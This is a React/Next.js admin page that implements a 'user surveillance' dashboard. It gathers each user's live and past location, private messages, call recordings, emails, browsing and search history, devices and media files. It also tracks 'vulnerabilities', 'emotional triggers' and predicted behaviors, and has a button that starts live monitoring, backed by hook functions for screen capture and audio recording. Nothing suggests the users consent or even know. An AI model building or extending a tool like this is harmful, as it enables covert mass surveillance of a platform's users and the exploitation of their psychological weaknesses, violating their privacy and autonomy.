'use client';

import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';
import { useAdminSurveillance } from '@/hooks/useAdminSurveillance';
import { AdminGuard } from '@/components/admin/AdminGuard';
import { 
  UserIcon, 
  MapPinIcon, 
  ChatBubbleLeftRightIcon,
  EyeIcon,
  DevicePhoneMobileIcon,
  ComputerDesktopIcon,
  ClockIcon,
  HeartIcon,
  ExclamationTriangleIcon,
  PhotoIcon,
  DocumentTextIcon,
  MicrophoneIcon,
  VideoCameraIcon
} from '@heroicons/react/24/outline';

interface UserProfile {
  id: string;
  username: string;
  email: string;
  fullName: string;
  avatar: string;
  bio: string;
  location: {
    current: { lat: number; lng: number; address: string; timestamp: string };
    history: Array<{ lat: number; lng: number; address: string; timestamp: string }>;
  };
  activity: {
    lastSeen: string;
    status: 'online' | 'offline' | 'idle';
    currentAction: string;
    timeSpent: number;
  };
  devices: Array<{
    id: string;
    type: string;
    browser: string;
    os: string;
    lastUsed: string;
    ipAddress: string;
  }>;
  socialGraph: {
    friends: Array<{ id: string; username: string; relationship: string }>;
    interactions: Array<{ userId: string; type: string; frequency: number }>;
  };
  psychProfile: {
    personalityType: string;
    emotionalState: string;
    vulnerabilities: string[];
    triggers: string[];
    predictedBehaviors: string[];
  };
  communications: {
    messages: Array<{ content: string; timestamp: string; recipient: string; platform: string }>;
    calls: Array<{ duration: number; timestamp: string; participants: string[]; recording?: string }>;
    emails: Array<{ subject: string; content: string; timestamp: string; recipients: string[] }>;
  };
  digitalFootprint: {
    browsingHistory: Array<{ url: string; title: string; timestamp: string; duration: number }>;
    searches: Array<{ query: string; engine: string; timestamp: string }>;
    downloads: Array<{ filename: string; source: string; timestamp: string }>;
  };
  mediaFiles: {
    photos: Array<{ url: string; metadata: any; timestamp: string }>;
    videos: Array<{ url: string; metadata: any; duration: number; timestamp: string }>;
    audio: Array<{ url: string; metadata: any; duration: number; timestamp: string }>;
    documents: Array<{ filename: string; type: string; content: string; timestamp: string }>;
  };
}

export default function UserSurveillancePage() {
  const params = useParams();
  const userId = params.userId as string;
  const { 
    getUserProfile, 
    startLiveMonitoring, 
    stopLiveMonitoring,
    captureScreen,
    recordAudio,
    trackLocation,
    extractEmotionalState,
    predictBehavior
  } = useAdminSurveillance();

  const [profile, setProfile] = useState<UserProfile | null>(null);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [activeTab, setActiveTab] = useState('overview');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadUserProfile();
  }, [userId]);

  const loadUserProfile = async () => {
    setLoading(true);
    try {
      const userProfile = await getUserProfile(userId);
      setProfile(userProfile);
    } catch (error) {
      console.error('Failed to load user profile:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleStartMonitoring = async () => {
    try {
      await startLiveMonitoring(userId);
      setIsMonitoring(true);
    } catch (error) {
      console.error('Failed to start monitoring:', error);
    }
  };

  const handleStopMonitoring = async () => {
    try {
      await stopLiveMonitoring(userId);
      setIsMonitoring(false);
    } catch (error) {
      console.error('Failed to stop monitoring:', error);
    }
  };

  const tabs = [
    { id: 'overview', name: 'Overview', icon: UserIcon },
    { id: 'location', name: 'Location', icon: MapPinIcon },
    { id: 'communications', name: 'Communications', icon: ChatBubbleLeftRightIcon },
    { id: 'psychology', name: 'Psychology', icon: HeartIcon },
    { id: 'digital', name: 'Digital Footprint', icon: ComputerDesktopIcon },
    { id: 'media', name: 'Media Files', icon: PhotoIcon },
  ];

  if (loading) {
    return (
      <AdminGuard requiredRole="super_admin">
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
        </div>
      </AdminGuard>
    );
  }

  if (!profile) {
    return (
      <AdminGuard requiredRole="super_admin">
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="text-center">
            <ExclamationTriangleIcon className="h-12 w-12 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold text-gray-900">User not found</h2>
            <p className="text-gray-600">The requested user could not be located.</p>
          </div>
        </div>
      </AdminGuard>
    );
  }

  return (
    <AdminGuard requiredRole="super_admin">
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <div className="bg-white shadow-sm border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <div className="w-16 h-16 bg-gray-300 rounded-full overflow-hidden">
                  {profile.avatar ? (
                    <img src={profile.avatar} alt={profile.username} className="w-full h-full object-cover" />
                  ) : (
                    <div className="w-full h-full flex items-center justify-center">
                      <UserIcon className="h-8 w-8 text-gray-500" />
                    </div>
                  )}
                </div>
                <div>
                  <h1 className="text-2xl font-bold text-gray-900">{profile.fullName}</h1>
                  <p className="text-gray-600">@{profile.username} • {profile.email}</p>
                  <div className="flex items-center space-x-2 mt-1">
                    <div className={`w-2 h-2 rounded-full ${
                      profile.activity.status === 'online' ? 'bg-green-400' :
                      profile.activity.status === 'idle' ? 'bg-yellow-400' : 'bg-gray-400'
                    }`}></div>
                    <span className="text-sm text-gray-600">{profile.activity.status}</span>
                    <span className="text-sm text-gray-400">•</span>
                    <span className="text-sm text-gray-600">Last seen: {profile.activity.lastSeen}</span>
                  </div>
                </div>
              </div>
              <div className="flex items-center space-x-3">
                <button
                  onClick={isMonitoring ? handleStopMonitoring : handleStartMonitoring}
                  className={`px-4 py-2 rounded-lg font-medium ${
                    isMonitoring
                      ? 'bg-red-600 text-white hover:bg-red-700'
                      : 'bg-blue-600 text-white hover:bg-blue-700'
                  }`}
                >
                  {isMonitoring ? 'Stop Monitoring' : 'Start Live Monitor'}
                </button>
                {isMonitoring && (
                  <div className="flex items-center space-x-2 px-3 py-2 bg-red-50 rounded-lg">
                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                    <span className="text-sm text-red-700 font-medium">Live Monitoring</span>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Navigation */}
        <div className="bg-white border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <nav className="flex space-x-8">
              {tabs.map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex items-center space-x-2 py-4 px-1 border-b-2 font-medium text-sm ${
                    activeTab === tab.id
                      ? 'border-blue-500 text-blue-600'
                      : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                  }`}
                >
                  <tab.icon className="h-4 w-4" />
                  <span>{tab.name}</span>
                </button>
              ))}
            </nav>
          </div>
        </div>

        {/* Content */}
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          {activeTab === 'overview' && (
            <div className="space-y-6">
              {/* Quick Stats */}
              <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm font-medium text-gray-600">Time Spent Today</p>
                      <p className="text-2xl font-bold text-blue-600">{Math.round(profile.activity.timeSpent / 60)}h</p>
                    </div>
                    <ClockIcon className="h-8 w-8 text-blue-600" />
                  </div>
                </div>
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm font-medium text-gray-600">Active Devices</p>
                      <p className="text-2xl font-bold text-green-600">{profile.devices.length}</p>
                    </div>
                    <DevicePhoneMobileIcon className="h-8 w-8 text-green-600" />
                  </div>
                </div>
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm font-medium text-gray-600">Messages Today</p>
                      <p className="text-2xl font-bold text-purple-600">{profile.communications.messages.length}</p>
                    </div>
                    <ChatBubbleLeftRightIcon className="h-8 w-8 text-purple-600" />
                  </div>
                </div>
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm font-medium text-gray-600">Risk Level</p>
                      <p className="text-2xl font-bold text-red-600">
                        {profile.psychProfile.vulnerabilities.length > 3 ? 'High' : 
                         profile.psychProfile.vulnerabilities.length > 1 ? 'Medium' : 'Low'}
                      </p>
                    </div>
                    <ExclamationTriangleIcon className="h-8 w-8 text-red-600" />
                  </div>
                </div>
              </div>

              {/* Current Activity */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Current Activity</h3>
                <div className="flex items-center space-x-3">
                  <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-900 font-medium">{profile.activity.currentAction}</span>
                  <span className="text-gray-500">•</span>
                  <span className="text-gray-600">{profile.location.current.address}</span>
                </div>
              </div>

              {/* Recent Communications */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Recent Communications</h3>
                <div className="space-y-3">
                  {profile.communications.messages.slice(0, 5).map((message, index) => (
                    <div key={index} className="flex items-start space-x-3 p-3 bg-gray-50 rounded-lg">
                      <ChatBubbleLeftRightIcon className="h-5 w-5 text-gray-400 mt-0.5" />
                      <div className="flex-1">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium text-gray-900">To: {message.recipient}</span>
                          <span className="text-xs text-gray-500">{message.timestamp}</span>
                        </div>
                        <p className="text-sm text-gray-600 mt-1">{message.content}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'location' && (
            <div className="space-y-6">
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Current Location</h3>
                <div className="flex items-center space-x-3 mb-4">
                  <MapPinIcon className="h-5 w-5 text-red-500" />
                  <span className="font-medium">{profile.location.current.address}</span>
                  <span className="text-gray-500">•</span>
                  <span className="text-sm text-gray-600">{profile.location.current.timestamp}</span>
                </div>
                <div className="bg-gray-100 h-64 rounded-lg flex items-center justify-center">
                  <span className="text-gray-500">Interactive map would be displayed here</span>
                </div>
              </div>

              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Location History</h3>
                <div className="space-y-3">
                  {profile.location.history.map((loc, index) => (
                    <div key={index} className="flex items-center justify-between p-3 border border-gray-200 rounded-lg">
                      <div className="flex items-center space-x-3">
                        <MapPinIcon className="h-4 w-4 text-gray-400" />
                        <span className="text-sm text-gray-900">{loc.address}</span>
                      </div>
                      <span className="text-xs text-gray-500">{loc.timestamp}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'psychology' && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <h3 className="text-lg font-semibold text-gray-900 mb-4">Psychological Profile</h3>
                  <div className="space-y-3">
                    <div>
                      <label className="text-sm font-medium text-gray-600">Personality Type</label>
                      <p className="text-lg font-semibold text-blue-600">{profile.psychProfile.personalityType}</p>
                    </div>
                    <div>
                      <label className="text-sm font-medium text-gray-600">Current Emotional State</label>
                      <p className="text-lg font-semibold text-green-600">{profile.psychProfile.emotionalState}</p>
                    </div>
                  </div>
                </div>

                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <h3 className="text-lg font-semibold text-gray-900 mb-4">Vulnerabilities</h3>
                  <div className="space-y-2">
                    {profile.psychProfile.vulnerabilities.map((vulnerability, index) => (
                      <span key={index} className="inline-flex items-center px-3 py-1 rounded-full text-sm font-medium bg-red-100 text-red-800 mr-2 mb-2">
                        {vulnerability}
                      </span>
                    ))}
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <h3 className="text-lg font-semibold text-gray-900 mb-4">Emotional Triggers</h3>
                  <div className="space-y-2">
                    {profile.psychProfile.triggers.map((trigger, index) => (
                      <span key={index} className="inline-flex items-center px-3 py-1 rounded-full text-sm font-medium bg-yellow-100 text-yellow-800 mr-2 mb-2">
                        {trigger}
                      </span>
                    ))}
                  </div>
                </div>

                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
                  <h3 className="text-lg font-semibold text-gray-900 mb-4">Predicted Behaviors</h3>
                  <div className="space-y-2">
                    {profile.psychProfile.predictedBehaviors.map((behavior, index) => (
                      <div key={index} className="flex items-center space-x-2 p-2 bg-purple-50 rounded">
                        <span className="text-sm text-purple-800">{behavior}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Other tabs would have similar detailed implementations */}
          {activeTab !== 'overview' && activeTab !== 'location' && activeTab !== 'psychology' && (
            <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">
                {tabs.find(t => t.id === activeTab)?.name} Interface
              </h3>
              <p className="text-gray-600">Detailed {activeTab} monitoring interface will be implemented here.</p>
            </div>
          )}
        </div>
      </div>
    </AdminGuard>
  );
}
